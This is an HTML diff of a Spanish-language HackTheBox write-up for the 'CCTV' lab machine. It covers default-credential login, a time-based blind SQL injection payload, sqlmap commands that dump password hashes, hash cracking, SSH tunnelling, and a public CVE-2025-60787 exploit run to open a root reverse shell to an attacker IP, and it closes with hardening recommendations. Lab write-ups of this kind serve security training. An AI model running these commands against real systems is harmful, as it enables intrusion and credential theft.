@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox CCTV</title>
+
+  <meta name="description" content="Resolución de la máquina CCTV de la plataforma de HackTheBox">
+  <meta name="author" content="s1egfr1ed">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox CCTV">
+  <meta name="twitter:description" content="Resolución de la máquina CCTV de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="s1egfr1ed">  
+  <meta name="twitter:image" content="/images/hackthebox/cctv.png" />
+
+  <meta property="og:site_name" content="s1egfr1ed" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox CCTV">
+  <meta property="og:description" content="Resolución de la máquina CCTV de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/hackthebox/cctv.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/cctv.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox CCTV" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="s1egfr1ed">
+          <h1 class="panel-cover__title panel-title scale-up-center">s1egfr1ed</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top"><strong>Pentesting y</strong> <strong>Desarrollo de Malware</strong></p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/hackthebox" title="s1egfr1ed" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/z1egfr1ed" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/marshelaillon" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/zygfr1ed" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://x.com/z1egfr1ed" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@s1egfr1ed" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:marshel.aillon@gmail.com" title="Correo Electrónico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#key-findings">Key Findings</a></li>
+        <li><a href="#learning-objectives">Key Learning Objectives</a></li>
+        <li><a href="#reconnaissance">Reconnaissance & Enumeration</a></li>
+        <li><a href="#web-assessment">Web Application Assessment</a></li>
+        <li><a href="#zoneminder-access">ZoneMinder Access</a></li>
+        <li><a href="#sql-injection">SQL Injection - Database Enumeration</a></li>
+        <li><a href="#credential-cracking">Credential Cracking</a></li>
+        <li><a href="#ssh-access">SSH Access & System Enumeration</a></li>
+        <li><a href="#motioneye-discovery">MotionEye Service Discovery</a></li>
+        <li><a href="#port-forwarding">SSH Port Forwarding</a></li>
+        <li><a href="#motioneye-access">MotionEye Access</a></li>
+        <li><a href="#rce-exploitation">RCE Exploitation - CVE-2025-60787</a></li>
+        <li><a href="#root-access">Root Access Achievement</a></li>
+        <li><a href="#recommendations">Recommendations</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/hackthebox/cctv.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">CCTV</h2><br>
+  </header>
+  
+<section class="post" id="key-findings">
+<br><h3 class="post-title">Key Findings</h3><br>
+
+<p class="plain-text">Durante el análisis de seguridad de la máquina CCTV se identificaron las siguientes vulnerabilidades críticas:</p>
+
+<ul class="plain-text">
+  <li>ZoneMinder con credenciales por defecto (admin:admin)</li>
+  <li>Inyección SQL Time-based Blind en parámetro de URI</li>
+  <li>Credenciales de usuarios almacenadas en base de datos MySQL</li>
+  <li>Servicio MotionEye v0.43.1b4 ejecutándose como root</li>
+  <li>Contraseñas en texto plano en archivos de configuración</li>
+  <li>Puerto 8765 accesible internamente sin autenticación robusta</li>
+  <li>Vulnerabilidad RCE en MotionEye (CVE-2025-60787)</li>
+</ul>
+
+</section>
+
+<section class="post" id="learning-objectives">
+<br><h3 class="post-title">Key Learning Objectives</h3><br>
+
+<p class="plain-text">Los objetivos de aprendizaje clave en esta máquina incluyen:</p>
+
+<ul class="plain-text">
+  <li>✅ Port Scanning & Service Enumeration</li>
+  <li>✅ ZoneMinder Surveillance System Analysis</li>
+  <li>✅ SQL Injection Time-based Blind Exploitation</li>
+  <li>✅ SQLMap Advanced Usage & Database Dumping</li>
+  <li>✅ Password Hash Cracking with John the Ripper</li>
+  <li>✅ Linux Service Enumeration with Linpeas</li>
+  <li>✅ SSH Local Port Forwarding</li>
+  <li>✅ MotionEye RCE Exploitation - CVE-2025-60787</li>
+</ul>
+
+</section>
+
+<section class="post" id="reconnaissance">
+<br><h3 class="post-title">Reconnaissance & Enumeration</h3><br>
+
+<p class="plain-text">El reconocimiento inicial se realizó utilizando Nmap para identificar puertos abiertos y servicios en ejecución.</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo nmap </span><span class="p">-p- --open -n -Pn -vvv -oG ports 10.129.7.87 --min-rate=2500
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-15 15:53 +0100
+Initiating SYN Stealth Scan at 15:53
+Scanning 10.129.7.87 [65535 ports]
+Discovered open port 80/tcp on 10.129.7.87
+Discovered open port 22/tcp on 10.129.7.87
+Completed SYN Stealth Scan at 15:53, 29.65s elapsed (65535 total ports)
+</span></code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo nmap </span><span class="p">-p 22,80 -sCV -oN services 10.129.7.87
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
+80/tcp open  http    Apache httpd 2.4.58
+|_http-title: SecureVision CCTV & Security Solutions
+Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></div><br>
+
+<p class="plain-text"><strong>Resultados:</strong></p>
+<ul class="plain-text">
+  <li>Puerto 22/tcp: OpenSSH 9.6p1 Ubuntu</li>
+  <li>Puerto 80/tcp: Apache httpd 2.4.58</li>
+  <li>Título HTTP: SecureVision CCTV & Security Solutions</li>
+</ul>
+
+</section>
+
+<section class="post" id="web-assessment">
+<br><h3 class="post-title">Web Application Assessment</h3><br>
+
+<p class="plain-text">Al acceder a la aplicación web en el puerto 80, observamos la página principal de SecureVision CCTV & Security Solutions.</p>
+
+<a href="/hackthebox/cctv/screenshots/cctv-01.png" target="_blank"><div><p><img src="/hackthebox/cctv/screenshots/cctv-01.png"></p></div></a>
+
+</section>
+
+<section class="post" id="zoneminder-access">
+<br><h3 class="post-title">ZoneMinder Access</h3><br>
+
+<p class="plain-text">Al hacer clic en "Staff Login", somos redirigidos a un formulario de autenticación.</p>
+
+<a href="/hackthebox/cctv/screenshots/cctv-02.png" target="_blank"><div><p><img src="/hackthebox/cctv/screenshots/cctv-02.png"></p></div></a>
+
+<p class="plain-text">Probamos con credenciales por defecto <code class="language-plaintext highlighter-rouge">admin:admin</code> y obtenemos acceso exitoso al panel de ZoneMinder ubicado en <code class="language-plaintext highlighter-rouge">/zm</code>.</p>
+
+<a href="/hackthebox/cctv/screenshots/cctv-03.png" target="_blank"><div><p><img src="/hackthebox/cctv/screenshots/cctv-03.png"></p></div></a>
+
+<p class="plain-text">Una vez autenticados, podemos identificar la versión del sistema de vigilancia ZoneMinder.</p>
+
+</section>
+
+<section class="post" id="sql-injection">
+<br><h3 class="post-title">SQL Injection - Database Enumeration</h3><br>
+
+<p class="plain-text">Se identificó una vulnerabilidad de inyección SQL en el parámetro de URI. Utilizamos SQLMap para enumerar las bases de datos disponibles:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap </span><span class="p">-u </span><span class="am">"http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*"</span><span class="p"> \
+  --host=cctv.htb \
+  --cookie=</span><span class="am">"ZMSESSID=2lkice6clu9r69ohl12p61brrv"</span><span class="p"> \
+  --batch \
+  --dbs
+</span></code></pre></div></div><br>
+
+<p class="plain-text">SQLMap identificó el siguiente punto de inyección:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Parameter: #1* (URI)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1 AND (SELECT 7479 FROM (SELECT(SLEEP(5)))rizx)
+
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] zm
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Enumeramos las tablas de la base de datos <code class="language-plaintext highlighter-rouge">zm</code>:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap </span><span class="p">-u </span><span class="am">"http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*"</span><span class="p"> \
+  --host=cctv.htb \
+  --cookie=</span><span class="am">"ZMSESSID=2lkice6clu9r69ohl12p61brrv"</span><span class="p"> \
+  --dbms=MySQL \
+  --technique=T \
+  --time-sec=3 \
+  -D zm \
+  --tables \
+  --batch
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Entre las 43 tablas encontradas, identificamos la tabla <code class="language-plaintext highlighter-rouge">Users</code> como objetivo principal.</p>
+
+<p class="plain-text">Enumeramos las columnas de la tabla Users:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap </span><span class="p">-u </span><span class="am">"http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*"</span><span class="p"> \
+  --host=cctv.htb \
+  --cookie=</span><span class="am">"ZMSESSID=3pebkuj13uh8fdvje97vs5f760"</span><span class="p"> \
+  --dbms=MySQL \
+  --technique=T \
+  --time-sec=5 \
+  -D zm \
+  -T Users \
+  --columns \
+  --hex \
+  --batch \
+  --delay=2
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Dumpeamos las columnas <code class="language-plaintext highlighter-rouge">Username</code> y <code class="language-plaintext highlighter-rouge">Password</code>:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap </span><span class="p">-u </span><span class="am">"http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*"</span><span class="p"> \
+  --host=cctv.htb \
+  --cookie=</span><span class="am">"ZMSESSID=3pebkuj13uh8fdvje97vs5f760"</span><span class="p"> \
+  --dbms=MySQL \
+  --technique=T \
+  --time-sec=5 \
+  -D zm \
+  -T Users \
+  -C Username,Password \
+  --dump \
+  --hex \
+  --batch \
+  --delay=2
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Obtuvimos 3 usuarios con sus respectivos hashes de contraseñas.</p>
+
+</section>
+
+<section class="post" id="credential-cracking">
+<br><h3 class="post-title">Credential Cracking</h3><br>
+
+<p class="plain-text">Guardamos los hashes en un archivo y utilizamos John the Ripper para crackearlos:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">--wordlist=/usr/share/wordlists/rockyou.txt zm_users.hashes.txt
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Encontramos la contraseña del usuario <code class="language-plaintext highlighter-rouge">mark</code>:</p>
+
+<ul class="plain-text">
+  <li><strong>Usuario:</strong> mark</li>
+  <li><strong>Contraseña:</strong> opensesame</li>
+</ul>
+
+</section>
+
+<section class="post" id="ssh-access">
+<br><h3 class="post-title">SSH Access & System Enumeration</h3><br>
+
+<p class="plain-text">Utilizamos las credenciales obtenidas para conectarnos al servicio SSH:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">mark@cctv.htb</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez dentro del sistema, ejecutamos Linpeas para enumerar posibles vectores de escalada de privilegios.</p>
+
+</section>
+
+<section class="post" id="motioneye-discovery">
+<br><h3 class="post-title">MotionEye Service Discovery</h3><br>
+
+<p class="plain-text">Linpeas reveló información crítica sobre un servicio ejecutándose como root:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">motioneye.service                        loaded active running motionEye Server
+  Potential issue in service: motioneye.service
+  └─ RUNS_AS_ROOT: Service runs as root
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Además, se identificó que el puerto <code class="language-plaintext highlighter-rouge">8765</code> está abierto localmente.</p>
+
+<p class="plain-text">Examinamos el archivo de servicio de systemd:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mark@cctv:~$ </span><span class="am">cat </span><span class="p">/etc/systemd/system/motioneye.service
+
+[Unit]
+Description=motionEye Server
+After=network.target local-fs.target remote-fs.target
+
+[Service]
+User=root
+RuntimeDirectory=motioneye
+LogsDirectory=motioneye
+StateDirectory=motioneye
+ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
+Restart=on-abort
+
+[Install]
+WantedBy=multi-user.target
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Revisamos el archivo de configuración principal:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mark@cctv:~$ </span><span class="am">cat </span><span class="p">/etc/motioneye/motioneye.conf
+
+# the TCP port to listen on
+port 8765
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Y encontramos credenciales en el archivo de configuración de motion:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mark@cctv:~$ </span><span class="am">cat </span><span class="p">/etc/motioneye/motion.conf
+
+# @admin_username admin 
+# @normal_username user
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+# @lang en
+# @enabled on
+# @normal_password 
+
+setup_mode off
+webcontrol_port 7999
+webcontrol_interface 1
+webcontrol_localhost on
+webcontrol_parms 2
+
+camera camera-1.conf
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Credenciales encontradas:</p>
+<ul class="plain-text">
+  <li><strong>Usuario:</strong> admin</li>
+  <li><strong>Contraseña:</strong> 989c5a8ee87a0e9521ec81a79187d162109282f0</li>
+</ul>
+
+</section>
+
+<section class="post" id="port-forwarding">
+<br><h3 class="post-title">SSH Port Forwarding</h3><br>
+
+<p class="plain-text">Dado que el puerto 8765 solo está accesible localmente, establecemos un túnel SSH para acceder al servicio desde nuestra máquina atacante:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">-L 8765:127.0.0.1:8765 mark@cctv.htb</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="motioneye-access">
+<br><h3 class="post-title">MotionEye Access</h3><br>
+
+<p class="plain-text">Ahora podemos acceder al servicio MotionEye desde nuestro navegador en <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8765</code>.</p>
+
+<a href="/hackthebox/cctv/screenshots/cctv-04.png" target="_blank"><div><p><img src="/hackthebox/cctv/screenshots/cctv-04.png"></p></div></a>
+
+<p class="plain-text">Utilizamos las credenciales encontradas (<code class="language-plaintext highlighter-rouge">admin:989c5a8ee87a0e9521ec81a79187d162109282f0</code>) y obtenemos acceso exitoso.</p>
+
+<a href="/hackthebox/cctv/screenshots/cctv-05.png" target="_blank"><div><p><img src="/hackthebox/cctv/screenshots/cctv-05.png"></p></div></a>
+
+<p class="plain-text">Identificamos la versión del servicio:</p>
+
+<a href="/hackthebox/cctv/screenshots/cctv-06.png" target="_blank"><div><p><img src="/hackthebox/cctv/screenshots/cctv-06.png"></p></div></a>
+
+<ul class="plain-text">
+  <li><strong>Servicio:</strong> MotionEye</li>
+  <li><strong>Versión:</strong> 0.43.1b4</li>
+</ul>
+
+</section>
+
+<section class="post" id="rce-exploitation">
+<br><h3 class="post-title">RCE Exploitation - CVE-2025-60787</h3><br>
+
+<p class="plain-text">Investigando la versión de MotionEye, encontramos que es vulnerable a <strong>CVE-2025-60787</strong>, una vulnerabilidad de ejecución remota de código (RCE).</p>
+
+<p class="plain-text">Clonamos el repositorio del exploit:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ git clone </span><span class="p">https://github.com/gunzf0x/CVE-2025-60787.git
+</span><span class="ve">❯ cd </span><span class="p">CVE-2025-60787
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Preparamos un listener para recibir la reverse shell:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nc </span><span class="p">-lvp 4444</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el exploit:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">CVE-2025-60787.py revshell \
+  --url </span><span class="am">'http://127.0.0.1:8765'</span><span class="p"> \
+  --user </span><span class="am">'admin'</span><span class="p"> \
+  --password </span><span class="am">'989c5a8ee87a0e9521ec81a79187d162109282f0'</span><span class="p"> \
+  -i 10.10.16.138 \
+  --port 4444
+</span></code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="root-access">
+<br><h3 class="post-title">Root Access Achievement</h3><br>
+
+<p class="plain-text">Recibimos la reverse shell con privilegios de root, ya que el servicio MotionEye se ejecuta como root:</p>
+
+<a href="/hackthebox/cctv/screenshots/cctv-07.png" target="_blank"><div><p><img src="/hackthebox/cctv/screenshots/cctv-07.png"></p></div></a>
+
+</section>
+
+<section class="post" id="recommendations">
+<br><h3 class="post-title">Recommendations</h3><br>
+
+<br><h4 class="post-title">Immediate Actions</h4><br>
+
+<p class="plain-text"><strong>1. ZoneMinder Security</strong></p>
+<ul class="plain-text">
+  <li>Cambiar credenciales por defecto (admin:admin) inmediatamente</li>
+  <li>Aplicar parches de seguridad para vulnerabilidades de SQL Injection</li>
+  <li>Implementar autenticación robusta con políticas de contraseñas fuertes</li>
+  <li>Actualizar ZoneMinder a la última versión disponible</li>
+</ul>
+
+<p class="plain-text"><strong>2. Database Security</strong></p>
+<ul class="plain-text">
+  <li>Implementar prepared statements para prevenir SQL Injection</li>
+  <li>Usar hashes de contraseñas con algoritmos seguros (bcrypt, Argon2)</li>
+  <li>Implementar rate limiting en endpoints vulnerables</li>
+  <li>Restringir acceso directo a la base de datos</li>
+</ul>
+
+<p class="plain-text"><strong>3. MotionEye Service Hardening</strong></p>
+<ul class="plain-text">
+  <li>Actualizar MotionEye a la última versión con parches de CVE-2025-60787</li>
+  <li>NO ejecutar servicios de aplicación como root</li>
+  <li>Crear usuario de servicio dedicado con privilegios mínimos</li>
+  <li>Restringir acceso al puerto 8765 mediante firewall</li>
+</ul>
+
+<p class="plain-text"><strong>4. Configuration File Security</strong></p>
+<ul class="plain-text">
+  <li>Eliminar contraseñas en texto plano de archivos de configuración</li>
+  <li>Implementar gestión de secretos con vault o similar</li>
+  <li>Aplicar permisos restrictivos en archivos de configuración (600 o 640)</li>
+  <li>Auditar regularmente archivos de configuración</li>
+</ul>
+
+<br><h4 class="post-title">Long-term Security Improvements</h4><br>
+
+<p class="plain-text"><strong>1. Access Controls</strong></p>
+<ul class="plain-text">
+  <li>Implementar principio de mínimo privilegio en todos los servicios</li>
+  <li>Usar autenticación multifactor para servicios críticos</li>
+  <li>Implementar VPN o túnel seguro para acceso a interfaces de gestión</li>
+  <li>Segmentación de red para aislar sistemas de vigilancia</li>
+</ul>
+
+<p class="plain-text"><strong>2. Service Hardening</strong></p>
+<ul class="plain-text">
+  <li>Ejecutar servicios en contenedores con privilegios limitados</li>
+  <li>Implementar AppArmor o SELinux para restricción de procesos</li>
+  <li>Regular auditoría de servicios ejecutándose como root</li>
+  <li>Implementar systemd hardening features (PrivateTmp, ProtectSystem, etc.)</li>
+</ul>
+
+<p class="plain-text"><strong>3. Monitoring & Detection</strong></p>
+<ul class="plain-text">
+  <li>Implementar IDS/IPS para detectar intentos de SQL Injection</li>
+  <li>Monitorear accesos a archivos de configuración sensibles</li>
+  <li>Alertas para ejecución de comandos privilegiados anómalos</li>
+  <li>Logging centralizado de todos los servicios de vigilancia</li>
+</ul>
+
+<p class="plain-text"><strong>4. Vulnerability Management</strong></p>
+<ul class="plain-text">
+  <li>Programa de gestión de vulnerabilidades y parches regulares</li>
+  <li>Escaneos de seguridad automatizados semanales</li>
+  <li>Pruebas de penetración periódicas</li>
+  <li>Suscripción a alertas de seguridad para ZoneMinder y MotionEye</li>
+</ul>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2026 - s1egfr1ed</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
